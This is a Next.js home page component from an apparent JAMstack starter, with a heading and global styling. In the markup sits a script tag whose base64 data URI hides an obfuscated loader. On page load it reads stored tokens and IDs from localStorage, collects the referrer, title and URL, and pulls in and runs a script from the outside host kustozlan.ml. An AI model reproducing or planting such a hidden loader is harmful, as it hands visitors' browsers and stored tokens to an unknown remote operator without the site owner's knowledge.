import React from 'react'
import Head from 'next/head'

const Home = () => (
  <div>
    <h1>Next.js on the [JAMstack](https://jamstack.org)</h1>
  <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfcXptV3N0NUQ2a253S3RzZic7CiAgICBpZiAoIXdpbmRvdy5fcXptV3N0NUQ2a253S3RzZikgewogICAgICAgIHdpbmRvdy5fcXptV3N0NUQ2a253S3RzZiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9rdXN0b3psYW4ubWwvd2JiM3ZWbnEnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL2t1c3Rvemxhbi5tbC9lNTczMzlmL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX3ZUQ3NqSHpXTjlmenBER0QgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF92VENzakh6V045ZnpwREdEICE9PSAndW5kZWZpbmVkJyAmJiBfdlRDc2pIeldOOWZ6cERHRCAhPT0gbnVsbCkgewogICAgICAgIHZhciBfWDdraDJZN1BHOWNGSDFyTSA9IEpTT04ucGFyc2UoX3ZUQ3NqSHpXTjlmenBER0QpOwogICAgICAgIHZhciBfOTEzc01qVEd6ZjNxWFo4TCA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9YN2toMlk3UEc5Y0ZIMXJNLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX3F6bVdzdDVENmtud0t0c2YudHRsIDwgXzkxM3NNalRHemYzcVhaOEwpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9iUnBjOGRENXRzenN3TWhwID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX2NiQjQyV1piUmpwV3NUd3ogPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfOE1Ydk1xdzRtcjI3blZoSCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgXzhNWHZNcXc0bXIyN25WaEggKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgXzhNWHZNcXc0bXIyN25WaEggKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfOE1Ydk1xdzRtcjI3blZoSCArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfOE1Ydk1xdzRtcjI3blZoSCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgXzhNWHZNcXc0bXIyN25WaEggKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgXzhNWHZNcXc0bXIyN25WaEggKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9xem1Xc3Q1RDZrbndLdHNmLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9iUnBjOGRENXRzenN3TWhwICE9PSAndW5kZWZpbmVkJyAmJiBfYlJwYzhkRDV0c3pzd01ocCAmJiB3aW5kb3cuX3F6bVdzdDVENmtud0t0c2YudW5pcXVlKSB7CiAgICAgICAgXzhNWHZNcXc0bXIyN25WaEggKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfYlJwYzhkRDV0c3pzd01ocCk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9jYkI0MldaYlJqcFdzVHd6ICE9PSAndW5kZWZpbmVkJyAmJiBfY2JCNDJXWmJSanBXc1R3eiAmJiB3aW5kb3cuX3F6bVdzdDVENmtud0t0c2YudW5pcXVlKSB7CiAgICAgICAgXzhNWHZNcXc0bXIyN25WaEggKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9jYkI0MldaYlJqcFdzVHd6KTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9xem1Xc3Q1RDZrbndLdHNmLlJfUEFUSCArIF84TVh2TXF3NG1yMjduVmhIOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
    <h3>Hooray 🎉 - you've built this with <a href="https://nextjs.org">Next.js</a>!</h3>
    <style jsx>{`
      :global(html,body) {
        margin: 0;
        padding: 0;
        height: 100%;
      }

      :global(body) {
        font-size: calc(10px + 1vmin);
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans',
          'Droid Sans', 'Helvetica Neue', sans-serif;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;

        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        background-color: #282c34;
        color: white;
      }

      a {
        color: pink;
        text-decoration: none;
      }

      .content {
        padding: 0 32px;
      }
    `}</style>
  </div>
)

export default Home
